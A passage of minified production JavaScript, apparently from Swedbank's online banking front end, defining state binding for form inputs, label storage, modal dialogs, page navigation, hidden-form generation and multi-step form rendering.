CustomStorage(CustomStorage.GLOBAL_STORAGE_PREFIX,"localStorage"),Swedbank.sessionStorage=new CustomStorage(CustomStorage.GLOBAL_STORAGE_PREFIX,"sessionStorage"),State.EVENTS=["change"],State.prototype.createShortcutFunction=function(){var shortcutFunction=function(newValue){return arguments.length?this.set(newValue):this.get()}.bind(this);for(var method in State.prototype)State.prototype.hasOwnProperty(method)&&(shortcutFunction[method]=State.prototype[method].bind(this));return shortcutFunction.prototype=State.prototype,shortcutFunction},State.prototype.get=function(){return this.value},State.prototype.set=function(newValue){this.value!==newValue&&this.changingIsAllowed(newValue)&&(this.value=newValue,this.executeCallbacks())},State.prototype.executeCallbacks=function(){this.callbacks.after.change.forEach((function(callback){callback(this.value)}),this)},State.prototype.changingIsAllowed=function(newValue){return 0==this.callbacks.before.change.filter((function(callback){return!1===callback(newValue)})).length},State.prototype.before=function(eventName,callback){if(!this.callbacks.before[eventName])throw new TypeError("Supplied event type not supported.");return this.callbacks.before[eventName].push(callback),this},State.prototype.after=function(eventName,callback){if(!this.callbacks.after[eventName])throw new TypeError("Supplied event type not supported.");return this.callbacks.after[eventName].push(callback),this},State.prototype.when=function(expectedValue,callback){this.after("change",(function(newValue){newValue===expectedValue&&callback(newValue)}))},ComputedState.EVENTS=["change"],ComputedState.prototype.createShortcutFunction=function(){var shortcutFunction=function(){return this.get()}.bind(this);for(var method in ComputedState.prototype)ComputedState.prototype.hasOwnProperty(method)&&(shortcutFunction[method]=ComputedState.prototype[method].bind(this));return shortcutFunction.prototype=ComputedState.prototype,shortcutFunction},ComputedState.prototype.get=function(){return this.value},ComputedState.prototype.setDependencies=function(dependencies){return Array.isArray(dependencies)||(dependencies=[dependencies]),this.dependencies=dependencies,this.computeLogic&&this.hookToDependenciesChangeEvents(),this},ComputedState.prototype.hookToDependenciesChangeEvents=function(){var computedState=this;this.dependencies.forEach((function(state){if(!state||![State.prototype,ComputedState.prototype].includes(state.prototype))throw new TypeError("Given dependency is not an instance of State or ComputedState");state.after("change",(function(){computedState.compute()}))}))},ComputedState.prototype.setComputeLogic=function(computeLogic){if(!(computeLogic instanceof Function))throw new TypeError("Compute logic missing");return this.computeLogic=computeLogic,this.dependencies.length>0&&this.hookToDependenciesChangeEvents(),this},ComputedState.prototype.compute=function(executeCallbacks){if(executeCallbacks="boolean"!=typeof executeCallbacks||executeCallbacks,!this.computeLogic)throw new Error("Compute logic has not been specified");this.value!==(this.value=this.computeLogic())&&executeCallbacks&&this.callbacks.after.change.forEach((function(callback){callback(this.value)}),this)},ComputedState.prototype.after=function(eventName,callback){if(!this.callbacks.after[eventName])throw new TypeError("Supplied event type not supported.");return this.callbacks.after[eventName].push(callback),this},State.prototype.bindValueToElement=function(target){var state=this,$element=this.$element=jQuery(target);return this.value=$element.val(),$element.on("change keyup",(function(){state.set(state.get())})),$element.is(":checkbox")&&state.set(state.get()),$element.on("cut paste",(function(){setTimeout((function(){state.set($element.val())}))})),this},State.prototype.getRadioGroup=function(filter){var $group=jQuery("body").findByName(this.$element.attr("name"));return filter?$group.filter(filter):$group};var stateSetMethodProxy=State.prototype.set;State.prototype.set=function(){if(stateSetMethodProxy.apply(this,arguments),this.$element)if(this.$element.is(":text, textarea"))this.$element.val()!==this.value&&this.$element.val(this.value);else if(this.$element.is(":checkbox"))this.$element.prop("checked",1==this.value);else if(this.$element.is(":radio")){var $targetRadio=this.getRadioGroup().filter('[value="'+this.value+'"]');if(!$targetRadio.length&&!Swedbank.isProduction){var groupName=this.$element.attr("name");throw new ReferenceError('Could not find radio[name="'+groupName+'"] with value: '+this.value)}$targetRadio.prop("checked",!0)}return this};var stateGetMethodProxy=State.prototype.get;State.prototype.get=function(){var $element=this.$element;return $element?$element.is(":checkbox")?$element.is(":checked"):$element.is(":radio")?this.getRadioGroup(":checked").val():$element.val():stateGetMethodProxy.apply(this,arguments)},Swedbank.Helpers=class{static createParam(name,value){const param={};return param[name]=void 0===value||value,param}static breakText(text="",maxLength=40){let brokenStrings=[];return text.split(/\s/).forEach((fragment=>{for(;fragment.length>maxLength;)brokenStrings.push(fragment.substring(0,maxLength)),fragment=fragment.substring(maxLength);brokenStrings.push(fragment)})),brokenStrings.join(" ")}static removeScripts(str=""){return str.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,"")}static checkedFunction(fn){return"function"==typeof fn?fn:()=>{}}static getUrlAttrValue(paramName){return new URL(window.location.href).searchParams.get(paramName)}static getMediumPlatform(){const mobile=window.matchMedia("(max-width: 767px)"),tablet=window.matchMedia("(min-width: 768px) and (max-width: 1023px)"),desktop=window.matchMedia("(min-width: 1024px)");let medium;return medium=mobile.matches?"mobile":tablet.matches?"tablet":desktop.matches?"desktop":"",medium}static formatAmount(value){return null==value?"":value.toString().replace(/(\d)(?=(\d{3})+(?!\d))/g,"$1 ")}},function(){var LabelStorage={create:function(){var fn=function(id){return fn.get.apply(fn,arguments)};return Object.assign(fn,{cache:{},get:function(id,quantity){var quantityDefined=void 0!==quantity;quantityDefined&&(id+="."+SharedComponents.Grammar.quantify(quantity));var cachedLabel=this.cache[id],label=void 0===cachedLabel?id:cachedLabel;return quantityDefined&&(label=label.replace(/%q/g,quantity)),label},set:function(id,value){"string"==typeof id?this.cache[id]=value:Object.assign(this.cache,id)},exists:function(id){return this.cache.hasOwnProperty(id)}}),fn}};Swedbank.Labels=LabelStorage.create(),Swedbank.LabelsEng="ENG"===Swedbank.LANGUAGE?Swedbank.Labels:LabelStorage.create()}(),Swedbank.Viewport=class{static get width(){return window.innerWidth}static get height(){return window.innerHeight}static isMobile(){return Swedbank.Viewport.width<768}static isDesktop(){return Swedbank.Viewport.height>=1024}},function($){var Templates=Swedbank.Templates={action:function(options,action,pageId,confirmation){confirmation=void 0!==confirmation&&confirmation;var $action=$("<button/>",options).addClass("button");return(action||pageId)&&$action.click((function(event){if(event.preventDefault(),!$action.hasClass("disabled")){if(confirmation)return Swedbank.Modals.confirm(confirmation).done((function(){processAction()})),!1;processAction()}function processAction(){if("function"==typeof action)action();else{if("string"==typeof action){var actionObj={};actionObj[action]=!0,action=actionObj}Swedbank.Navigation.goTo(pageId,action||{})}}})),$action},createHelp:function(helpText){var $help=$("<div/>",{class:"help-action","data-help-text":helpText});return $help.on("click",(function(event){return event.preventDefault(),!0})),$help},createRow:function(titleId,options){var defaultOptions={required:!0,autoHelp:!0,id:void 0};options=$.extend(defaultOptions,options);var $row=$('<dt class="query-name"><span class="row-title"/><span class="row-help"/></dt><dd class="query-value"/>'),$titleCell=$row.filter("dt");return options.id&&$row.attr("id",options.id),options.class&&$row.addClass(options.class),$row.on("titleidchange.sw",(function(event,newTitleId){$row.trigger("titlechange.sw",Swedbank.Labels(newTitleId)),options.autoHelp&&$row.trigger("helpidchange.sw","help_"+newTitleId)})),$row.on("titlechange.sw",(function(event,newTitle){$titleCell.find("span.row-title").text(newTitle)})),$row.on("contentchange.sw",(function(event,content){$row.filter("dd").html(content)})),$row.on("helpidchange.sw",(function(event,helpLabelId){var help=Swedbank.Labels.exists(helpLabelId)?Templates.createHelp(Swedbank.Labels(helpLabelId)):"";$titleCell.find("span.row-help").html(help)})),$row.on("markrequired.sw",(function(event,isRequired){isRequired=isRequired||void 0===isRequired,$titleCell.css({"font-weight":isRequired?"bold":"normal"}),"LV"!==Swedbank.country&&(isRequired?$titleCell.find(".row-title").after('<span class="required"> * </span>'):$titleCell.find(".required").remove())})),options.required&&$row.trigger("markrequired.sw",!0),titleId&&$row.trigger("titleidchange.sw",titleId),$row},createRow_old:function(titleId,options){var defaultOptions={titleAlignment:"right",required:!0,autoHelp:!0,id:void 0};options=$.extend(defaultOptions,options);var $tr=$('<tr><td><span class="row-title"/><span class="row-help"/></td><td/></tr>');options.id&&$tr.attr("id",options.id);var $titleCell=$tr.find("td:eq(0)");return $titleCell.css({"text-align":options.titleAlignment}),$tr.on("titleidchange.sw",(function(event,newTitleId){$tr.trigger("titlechange.sw",Swedbank.Labels(newTitleId)),options.autoHelp&&$tr.trigger("helpidchange.sw","help_"+newTitleId)})),$tr.on("titlechange.sw",(function(event,newTitle){$titleCell.find("span.row-title").text(newTitle)})),$tr.on("contentchange.sw",(function(event,content){$tr.find("td:eq(1)").html(content)})),$tr.on("helpidchange.sw",(function(event,helpLabelId){var help=Swedbank.Labels.exists(helpLabelId)?Templates.createHelp(Swedbank.Labels(helpLabelId)):"";$titleCell.find("span.row-help").html(help)})),$tr.on("markrequired.sw",(function(event,isRequired){isRequired=isRequired||void 0===isRequired,$titleCell.css({"font-weight":isRequired?"bold":"normal"}),"LV"!==Swedbank.country&&(isRequired?$titleCell.find(".row-title").after('<span class="required"> * </span>'):$titleCell.find(".required").remove())})),options.required&&$tr.trigger("markrequired.sw",!0),titleId&&$tr.trigger("titleidchange.sw",titleId),$tr}}}(jQuery),function($,SharedComponents){var Modals=Swedbank.Modals={},$window=$(window),debounce=SharedComponents.helpers.debounce;function Modal(id,options){var modal=Modals.cache[id]=this;this.id=id,this.$=$("#"+id),this.options=$.extend({showCloseAction:!0},options),this.$.length||(this.$=function createBlankModal(id){var $modal=$("<div/>",{class:"modal-window",id:id,tabindex:0,role:"dialog"});return $modal.append('<a href="#" class="modal-close-action" role="button" aria-label="'+Swedbank.Labels("close")+'"/><div class="modal-messages"> <div id="modalErrorMessagesContainer" style="display:none" class="error-message-container"><div id="modalErrorMessage"></div></div> <div id="modalLoginErrorMessagesContainer" style="display:none" class="error-message-container"><div id="modalLoginErrorMessage"></div></div> <div id="modalWarningMessagesContainer" style="display:none" class="warning-message-container"><div id="modalWarningMessage"></div></div> <div id="modal-login-error" style="display:none" class="warning-message-container"><div id="modal-login-warning"></div></div> <div id="modalInfoMessagesContainer" style="display:none" class="info-message-container"><div id="modalInfoMessage"></div></div> <div id="modalSuccessMessagesContainer" style="display:none" class="success-message-container"><div id="modalSuccessMessage"></div></div></div><div class="modal-body"></div>'),$modal.insertAfter(Modals.$mask)}(id)),this.$.data("instance",this),this.$.attr("data-close-action",this.options.showCloseAction),this.$body=this.$.find(".modal-body");for(var i=0;i<this.$body.children().length;i++)"iframe"!==this.$body.children()[i].tagName.toLowerCase()&&"object"!==this.$body.children()[i].tagName.toLowerCase()&&"embed"!==this.$body.children()[i].tagName.toLowerCase()||this.$.find(this.$body.children()[i]).wrap('<div class="media">');return this.$.on("click",".modal-close-action",(function(e){e.preventDefault(),modal.$.trigger("modalclose",modal)})),this.$body.on("curtain-opened curtain-closed",(function(){modal.center(!0),Modals.resizeMask()})),this}Modals.cache={},Modals.$mask=null,Modals._scrollTop=0,Modal.prototype.open=function(callback){this&&this.$.trigger("modalopen",this),this.$.css("z-index",this.$.next(".modal-window").getZIndex()+1),$(".tooltip-container.-open").length>0&&Tooltip.instance&&Tooltip.instance.close();var modalsNotToMove=["movePopup","saveToFilePanel","exceedLimitPanel","becomeClient","flashPanel","flashPanel2","flashPanel3","contactForm","writeUs","termLifeConsultPopup","valuationReportPopup","ihomeofferform","changeDatePopup","companysList","form-register","form-register-cashless","form-register-partner","form-register-challenge","goForARide","activateSecureShopping","goForARide","checkRegistration","paymentPortalRegister","consult-popup","offerModal","renovationForm","contactlessForm","carForm","courseRegistration","gatewayForm","askAdvice","leasePopUp","portalForm","erply-demodays","eSmartCloseForm","amlpforced","askOfferForm","askTrafficOffer"];if(!this.$.parent().is(Modals.$container)&&!modalsNotToMove.includes(this.id)){var that=this;$((function(){that.$.appendTo(Modals.$container),that.center()}))}return modalsNotToMove.includes(this.id)&&!this.$.parent().is("#mainForm")&&(this.$.find("script").remove(),this.$.prependTo("#mainForm")),Modals.applyShadowing(),this.$body.find("iframe").exists()&&$(".media iframe").each((function(){$(this).attr("src").includes("?enablejsapi=1")||$(this).attr("src",$(this).attr("src")+"?enablejsapi=1")})),this.$.addClass("modal-visible"),$("body").addClass("modal-open"),this.$.data("original-height")||this.$.data("original-height",this.$.height()),this.$.isInside("#mainForm")||this.$.find(":input:visible:first").trigger("focus"),this.$.find(".modal-messages").prependTo(this.$body),this.center(),Modals.resizeMask(),this.$.focus(),"function"==typeof callback&&callback(),this},Modal.prototype.close=function(){var top;return this.$.removeClass("modal-visible"),$("body").hasClass("modal-open")&&(top=-parseInt($(".page-content").css("margin-top")),$(".page-content").removeAttr("style")),$("body").removeClass("modal-open"),this.$body.find(".media").exists()&&$(".media iframe").each((function(){$(this)[0].contentWindow.postMessage('{"event": "command", "func": "pauseVideo", "args": ""}',"*")})),$(".modal-visible").length||Modals.removeShadowing(),top>0&&window.scrollTo(0,top),this},Modal.prototype.setTitle=function(title){var $title=this.$body.find("h2").first();return $title.length||($title=$("<h2/>"),this.$body.prepend($title)),$title.html(title),this},Modal.prototype.setContent=function(content,callback){var $content=$($.parseHTML(content)),modal=this;if(callback){var body=this.$body[0],delayedCallback=debounce((function(observer){modal.center(),callback(),observer.disconnect()}),20);new MutationObserver((function(mutations,observer){delayedCallback(observer)})).observe(body,{childList:!0})}return $content.first().is(":header")?this.$body.html($content):(this.$body.html(this.$body.find("h2").first()),this.$body.append(content)),this},Modal.prototype.loadContent=function(params){var modal=this;modal.setContent('<div style="text-align: center"><ins class="loader"></ins>').open();var pageId=params.pageId||Swedbank.Navigation.pageId||"";return Swedbank.Navigation.pageId.startsWith("business")&&"private"==pageId.split(".")[0]&&(params.securityId=""),makeAjaxRequest(document.mainForm,params,(function(response){ErrorMessage.clear();var json=response.responseJSON;if(json&&json.exception)modal.setContent(""),ErrorMessage.add(json.exception);else{modal.setContent(response.responseText.replace(/name="navForm"/g,'name="__fakeNavForm__"')),Swedbank.Forms.generateDefinitionListClasses(modal.$body.find(".query-params-list"));try{Swedbank.responsiveTables(modal.$body.find(".default-table"))}catch(e){}}modal.center()}))},Modal.prototype.center=function(animate){this.$body.css("max-height",window.innerHeight-80)},Modal.prototype.onOpen=function(callback){this.$.on("modalopen",callback)},Modal.prototype.onClose=function(callback){this.$.on("modalclose",callback)},Modals.create=function(id,options){return new Modal(id,options)},Modals.get=function(id){return Modals.cache[id]},Modals.open=function(id,callback){(Modals.get(id)||Modals.create(id)).open(callback)},Modals.close=function(id){var modal=Modals.get(id)||$(".modal-visible").data("instance");modal&&modal.$.trigger("modalclose",modal)},Modals.getActive=function(){return $(".modal-visible").first().data("instance")},Modals.closeActive=function(){var modal=Swedbank.Modals.getActive();modal&&modal.$.trigger("modalclose",modal)},Modals.confirm=function(title,description,options){description=description||"",options=$.extend({id:"confirm-modal",showCloseAction:!1},options||{});var modal=Modals.create(options.id,options),deferred=new $.Deferred,buttons=function getConfirmationButtons(){var buttons=options.buttons;return SharedComponents.helpers.isPlainObject(buttons)&&"positive"in buttons&&"negative"in buttons?buttons:"confirmDecline"===buttons?{positive:Swedbank.Labels("btnConfirm"),negative:Swedbank.Labels("btnDecline")}:{positive:Swedbank.Labels("yes"),negative:Swedbank.Labels("no")}}();return modal.setTitle(title).setContent((""!=description?"<p>"+description+"</p>":"")+'<div class="form-button-bar">  <a href="#" class="button -destructive">'+buttons.negative+'</a>  <a href="#" class="button">'+buttons.positive+"</a></div>").open(),modal.$.addClass("-confirmation"),modal.$.find(".button").setDefault("click",(function(){modal.$.trigger("modalclose",modal),$(this).hasClass("-destructive")?deferred.reject():deferred.resolve()})),deferred.promise()},Modals.alert=function(title,description,options){return description=description||"",$.Deferred((function(deferred){var modal=Modals.create("alert-modal",options);modal.setTitle(title).setContent((""!=description?"<p>"+description+"</p>":"")+'<div class="form-button-bar">  <a href="#" class="button">'+Swedbank.Labels("btnOk")+"</a></div>").open(),modal.$.addClass("-alert"),modal.$.find(".button").setDefault("click",(function(){modal.$.trigger("modalclose",modal)})),modal.$.on("modalclose",(function(){deferred.resolve()}))}))},Modals.applyShadowing=function(){Modals._scrollTop=Math.max(window.pageYOffset,document.documentElement.scrollTop,document.body.scrollTop),$("html").addClass("modal-window-open")},Modals.removeShadowing=function(){$("html").removeClass("modal-window-open")},Modals.resizeMask=function(){if(Modals.$mask)Modals.getActive()},Modals.loadOffer=function(params){var offerPageId=Swedbank.Navigation.isBusiness()?"business.useful.offerdetail":"private.home.important.offers.offerdetail";params=$.extend({pageId:offerPageId},params),Swedbank.Modals.create("bankOfferModal").loadContent(params)},Modals.loadBankOffer=function(params){var offerPageId=Swedbank.Navigation.isBusiness()?"business.useful.bankOffer":"private.home.important.offers.bankOffer";params=$.extend({pageId:offerPageId},params),Swedbank.Modals.create("bankOfferModal").loadContent(params)},Modals.loadContent=function(pageId,data){var params=$.extend({},data,{pageId:pageId});Modals.create("loadContentModal").loadContent(params)},Modals.loadBody=function(panelContainerId,pageId,addParams){var params=$.extend({pageId:pageId},addParams);document.mainForm.attributesCheckNumber&&(params.attributesCheckNumber=$(document.mainForm.attributesCheckNumber).val()),Modals.create(panelContainerId+"Modal").loadContent(params).done((function(r){null!=r.responseJSON&&null!=r.responseJSON.exception&&ErrorMessage.set(r.responseJSON.exception),BankOffers.changeOffersGiven(params.offerUniqueId)}))},Swedbank.PageLoad.onFirst((function(){Modals.$container=$('<div id="modal-container"/>').appendTo("body"),Modals.$mask=$('<div id="modal-mask"/>').appendTo(Modals.$container),document.querySelector("#modal-container").addEventListener("touchmove",(function(e){var activeModal=document.querySelectorAll(".modal-visible .modal-body")[0];(activeModal.scrollHeight===activeModal.offsetHeight||$(activeModal).isInside("#mainForm"))&&(e.preventDefault(),e.stopPropagation())}),{capture:!1}),Modals.$mask.on("click",(function(event){var activeModal=Modals.getActive(),$target=$(event.target);!activeModal||$target.is(activeModal.$)||$target.closest(".modal-window").is(activeModal.$)||$target.is(".modal-close-action")||activeModal.$.trigger("modalclose",activeModal)})),$("body").on("modalclose",".modal-window",(function(event,modal){event.isDefaultPrevented()||modal.close()})),document.addEventListener("keydown",(function(event){SharedComponents.keyboard.isEscapePressed(event)&&Modals.closeActive()}));$window.on("resize",SharedComponents.helpers.debounce((function(){$(".modal-visible").each((function(){$(this).data("instance").center()})),Modals.resizeMask()}),250));var hash=Swedbank.Navigation.getHash(),matches=hash&&hash.match(/modal=(\w+(-\w+)+|\w+)/),modalId=matches&&matches[1];if(modalId)try{$("#"+modalId).is(".modal-window")&&setTimeout((function(){Swedbank.Modals.open(modalId)}),200)}catch(e){}}));const modalResetCallback=()=>{$("#modal-container").find(".modal-window").remove(),Modals.removeShadowing(),Modals.cache={},$("body").removeClass("modal-open"),$("#wrap").removeAttr("style")};Swedbank.isUiSpaEnabled?SharedComponents.eventBus.addEventListener("spa-navigation-start",modalResetCallback):Swedbank.PageLoad.onEachUnload(modalResetCallback)}(jQuery,SharedComponents),function(){var Navigation=Swedbank.Navigation={sessionIdPattern:/;jsessionid=([A-z0-9!\-.]+)/,pageId:"",privateHomeId:"private.d2d.start",businessHomeId:"business.d2d.start",referrer:document.referrer,getLastPageId:function(){return Swedbank.Navigation.lastPageId},getHash:function(unescape){var escape=!unescape,hash=!!location.hash&&location.hash.substr(1);return hash&&escape&&encodeURI(hash)||hash},setHash:function(hash){location.hash=hash},getSessionId:function(){var jsessionid=this.sessionIdPattern.test(location.href)&&location.href.match(this.sessionIdPattern)[1];if(!1===jsessionid){var url=Swedbank.Navigation.url;jsessionid=this.sessionIdPattern.test(url)&&url.match(this.sessionIdPattern)[1]}return jsessionid},removeSessionId:function(url){return url.replace(Navigation.sessionIdPattern,"")},getBasePath:function(path){return path=path||location.pathname,null!=(path=(path=(path=Navigation.removeSessionId(path)).replace(location.protocol+"//","")).replace(location.host,"")).match("/$")&&(path=path.replace(/.$/,"")),path},addHashListener:function(callback){"function"==typeof callback&&jQuery((function(){var hash=Navigation.getHash();!1!==hash&&callback(hash)}))},isPrivate:function(){return 0===Navigation.pageId.lastIndexOf("private",0)},isBusiness:function(){return 0===Navigation.pageId.lastIndexOf("business",0)},goTo:function(pageId,parameters){if(null!=Swedbank.chatStartable&&(Swedbank.chatStartable=!1),"object"==typeof pageId&&(parameters=pageId,pageId=Swedbank.Navigation.pageId),parameters){var propertiesCount=0;if(parameters=jQuery.map(parameters,(function(value,key){return propertiesCount++,[key,value]})),propertiesCount>2&&Swedbank.isDevelopment)return void ErrorMessage.add("Swedbank.Navigation.goTo(): More than 2 key-value pairs are not supported.");linkAction.apply(this,[pageId].concat(parameters))}else navigateTo(pageId)},browserBack:function(){window.history.back()},createAction:function(options,params){options=jQuery.extend({href:"#"},options);var $action=jQuery("<a/>",options).addClass("button");return $action.data(params),$action},parseHash:function(){var hash=Navigation.getHash();if(hash)for(var params={},hashParts=hash.split("_"),i=0;i<hashParts.length;i++){var varValue=hashParts[i].split("=");params[varValue[0]]=varValue[1]}return params||!1},generateHash:function(params){var pairs=[];for(i in params)params.hasOwnProperty(i)&&pairs.push(i+"="+params[i]);return pairs.join("_")},activateCurtain:function(target){return this.activateTarget(target)},activateTab:function(target){return this.activateTarget(target,100)},activateTarget:function(target,offset){return new Promise((function(resolve,reject){var element="string"==typeof target?document.querySelector(target):target;element&&"function"==typeof element.activate?requestAnimationFrame((function(){element.activate(),SharedComponents.helpers.scrollTo(element,offset).then(resolve)})):resolve()}))}}}(),function($){var Forms=Swedbank.Forms={};Forms.connectDateFields=function($dateFields){$dateFields.filter(":first-child").each((function(){var $startDateField=$(this),$endDateField=$startDateField.nextAll(".date-field:not(:disabled)");$startDateField.datepicker("option","onSelect",(function(selectedDate){$endDateField.datepicker("option","minDate",selectedDate),setTimeout((function(){$endDateField.datepicker("show")}))}))}))},Forms.enhanceDateFields=function(){$.datepicker._gotoToday=function(id){var today=new Date,$dateRef=jQuery("<td><a>"+today.getDate()+"</a></td>");this._selectDay(id,today.getMonth(),today.getFullYear(),$dateRef)},$(".date-field:not(.hasDatepicker)").addDatepicker(),$(".date-field").on("click",(function(){$(this).datepicker("show")})),Forms.connectDateFields($(".period-selection-component .date-field:first-child"))},Forms.generateAdditionalForm=function(id,fields,options){options=$.extend({targetControlId:void 0,addCommonFields:!0},options),$("#"+id).remove(),options.targetControlId&&jQuery.extend(fields,{pageId:"controls",controlId:options.targetControlId});var $mainForm=$("#mainForm"),commonFieldsToAdd=["field1","value1","field2","value2"],commonFieldsToCopy=["securityId","encoding","language","duplicateToken","raw","timestamp","state","serial"];options.targetControlId||commonFieldsToCopy.unshift("pageId");var $form=$('<form method="POST" style="display:none"/>');function addFieldToForm($field){Forms.addFieldToForm($field,$form)}return $form.attr("id",id).attr("name",id).attr("action",$mainForm.attr("action")),function addFormToDom(){$form.appendTo(document.body)}(),$.each(fields,(function(name,value){addFieldToForm($('<input type="hidden"/>').attr("name",name).val(value))})),options.addCommonFields&&function addCommonFields(){commonFieldsToAdd.forEach((function(fieldName){$('<input type="hidden"/>').attr("name",fieldName).appendTo($form)})),commonFieldsToCopy.forEach((function(fieldName){var fieldInMainForm=$mainForm[0][fieldName];fieldInMainForm&&addFieldToForm($('<input type="hidden"/>').attr("name",fieldName).val(fieldInMainForm.value))}));var checkNumber=Swedbank.commonRequestParams.attributesCheckNumber;checkNumber&&addFieldToForm($('<input type="hidden"/>').attr("name","attributesCheckNumber").val(checkNumber))}(),$form},Forms.addFieldToForm=function($field,$form){$field.appendTo($form)},Forms.generateDefinitionListClasses=function(definitionList){$(definitionList).find("dd").each((function(){var $element=$(this),$row=$element.add($element.prev("dt"));$row.parent().is("dl > div")&&($row=$row.add($row.parent())),$element.hasClass("fillable-row","text-row","checkable-row","slider-row")||($element.find(":checkbox, :radio").length?$row.addClass("checkable-row"):$element.find(':text, :file, :password, [type="number"], [type="tel"], [type="month"], [type="time"], select, textarea, .button, .period').length?$row.addClass("fillable-row"):$element.find(".slider-component").length?$row.addClass("slider-row"):$row.addClass("text-row"))}))},Swedbank.PageLoad.onFirst((function(){var curtainStorage=new CustomStorage("curtains");$("body").on("curtain-open curtain-close",".additional-form-content-container",(function(event){var $container=$(event.target),$content=$container.children(".hidden-content"),rememberState=!0===$container.data("rememberState"),state="curtain-open"==event.type?"opened":"closed";"curtain-open"==event.type?($content.find(":input[disabled-until-closed]").removeAttr("disabled"),$content.slideDown(300,(function(){$container.trigger("curtain-opened")}))):($content.find(":input:not(:disabled)").attr("disabled-until-closed",!0).prop("disabled",!0),$content.slideUp(300,(function(){$container.trigger("curtain-closed")}))),$container.toggleClass("opened","curtain-open"==event.type),rememberState&&(this.id?curtainStorage.set(Swedbank.Navigation.pageId+":"+this.id+"State",state):Swedbank.warn("<additionalFormContent/> template requires ID to be set to work properly:",this))})),$(".additional-form-content-container[id]").each((function(){var $container=$(this),$content=$container.children(".hidden-content");"opened"===curtainStorage.get(Swedbank.Navigation.pageId+":"+this.id+"State")&&($container.addClass("opened"),$content.show())})),$("body").setDefault("click",".additional-form-content-container > a",(function(){var $button=$(this),$container=$button.parent(),$content=$button.next(".hidden-content");!$content.is(":animated")&&$content.length&&$container.trigger($content.is(":hidden")?"curtain-open":"curtain-close")})),$("body").on("curtain-open curtain-close",".additional-form-content-container",(function(event){var $container=$(this),$title=$container.children("a");if($container.data("openedTitle")){var titleText="curtain-open"===event.type?$container.data("openedTitle"):$container.data("closedTitle");$title.text(titleText)}}))}));const formsLoadCallback=()=>{Forms.generateDefinitionListClasses($(".query-params-list:not(.calculator-results dl, .reward-details dl)"))};Swedbank.isUiSpaEnabled?(SharedComponents.eventBus.addEventListener("spa-navigation-complete",formsLoadCallback),jQuery(formsLoadCallback)):Swedbank.PageLoad.onEach(formsLoadCallback)}(jQuery),function($){var Steps=Swedbank.Forms.Steps={};function renderStep(step){Steps.$list.append($("<li>").text(step.text).toggleClass("active",!0===step.active)).append(" ")}Steps.data=null,Steps.active=null,Steps.$list=null,Steps.renderList=function(data,$container){Steps.data=data,Steps.active=function getActive(){return Steps.data.filter((function(step){return step.active})).first()}(),function augmentStepsData(){Steps.data.forEach((function(step,index,steps){step.index=index,step.nr=index+1,step.isFirst=1===step.nr,step.isLast=step.nr===steps.length,step.showHelp=step.isFirst||!step.isLast}))}(),Steps.data.length>1&&(Steps.$list=$('<ol class="form-steps"/>').appendTo($container),Steps.data.forEach(renderStep),function makePreviousStepsNavigable(){Steps.data.forEach((function(step){step.$header=$("<h3>").text(step.text),step.nr<Steps.active.nr&&step.$header.wrap($('<a href="#"/>').data("setStep",step.id))}))}(),function visualizeProgress(){stylizeFormSteps(Steps.$list)}())},Steps.disableNavigation=function(){Steps.$list.addClass("navigation-disabled").on("click","a",!1)}}(jQuery),function($,Forms){var Navigation=Forms.Navigation={},createParam=Swedbank.Helpers.createParam,createAction=Swedbank.Navigation.createAction;function renderAction(text,customOptions,paramName){var options=$.extend({text:text},customOptions),param=paramName?createParam(paramName):{},$action=createAction(options,param);return $action.hasClass("-destructive")?Navigation.$bar.prepend($action):Navigation.$bar.append($action),$action}Navigation.navigate=function(params){$(document).trigger("form-navigate"),Swedbank.Navigation.goTo(params)},Navigation.attachNavigationBehaviour=function($form){$form.setDefault("click",[".button:not(.save-action, #executeButton, .info-action, .disabled, .custom-functionality)",".delete-action",".form-steps:not(.navigation-disabled) a"].join(","),(function(){var confirmMsg=$(this).attr("confirm"),params=$.data(this);$.isEmptyObject(params)||(confirmMsg?Swedbank.Modals.confirm(confirmMsg).done((function(){Navigation.navigate(params)})):Navigation.navigate(params))}))},Navigation.renderNeutralAction=function(text,paramName,options){renderAction(text,$.extend({class:"-guiding"},options),paramName)},Navigation.renderPositiveAction=function(text,paramName,options){return renderAction(text,options,paramName)},Navigation.renderNegativeAction=function(text,paramName,options){renderAction(text,$.extend({class:"-destructive"},options),paramName)},Navigation.renderActionBar=function(){var activeStep=Forms.Steps.active;if(Navigation.$bar=$('<div class="form-button-bar"></div>'),activeStep.signing){var param=activeStep.paramOnPreviousStep||"previousStep";Swedbank.Signing.addNegativeAction(param,Swedbank.Labels("btnBack"))}else activeStep.isFirst||function renderBackAction(text,param){text=text||Swedbank.Labels("btnBack"),param=param||"previousStep",Navigation.renderNeutralAction(text,param)}(activeStep.textOnPreviousStep,activeStep.paramOnPreviousStep),Forms.Steps.data.length>1&&(Navigation.$saveAction=function renderNextAction(text,param){return text=text||Swedbank.Labels("btnNext"),param=param||"nextStep",Navigation.renderPositiveAction(text,param)}(activeStep.textOnNextStep,activeStep.paramOnNextStep));Forms.$container.append(Navigation.$bar)}}(jQuery,Swedbank.Forms),function($,Forms){var Fields=Forms.Fields={};function createBooleanListField(field,value){var $container=$(),booleanValues=field.values.filter((x=>""!==x.value));return[].forEach.call(booleanValues,(function(option,index){var fieldId=field.name+"-"+index,$radio=$("<input/>",{type:"radio",value:option.value,checked:option.value===value,id:fieldId,name:field.name}),$label=$("<label/>",{for:fieldId,text:option.text}),$field=$('<div class="checkable-input-container"/>').append($radio).append($label);$container=$container.add($field)})),$container}function createListField(field,value){var $field=$();return $field=field.multiselect?function createMultiSelectListField(field,selectedFields){var $container=$();return[].forEach.call(field.values,(function(option,index){var fieldId=field.name+"-"+index,$checkbox=$("<input/>",{type:"checkbox",id:fieldId,name:field.name,value:option.value,checked:-1!==$.inArray(option.value,selectedFields)}),$label=$("<label/>",{for:fieldId,text:option.text}),$field=$('<div class="multiselect-input"/>').append($checkbox).append($label);$container=$container.add($field)})),$container}(field,value):function hasBooleanValuesOnly(field){return!!field.values.filter((o=>"boolean"==typeof o.value))[0]}(field)?field.emptyOption?createBooleanListField(field,value):function createBooleanField(field,value){return $("<input/>",{type:"checkbox",name:field.name,checked:!0===value})}(field,value):"radio"===field.listType?createBooleanListField(field,value):function createDropdownField(field){var $select=$("<select/>");return[].forEach.call(field.values,(function(option){var text=option.text;field.legend&&(text+=" "+field.legend),$("<option/>",{text:text,value:option.value}).appendTo($select)})),$select}(field),$field}function createDisabledField(field,value){var $field=$("<span/>");if(void 0!==value&&field.values){var 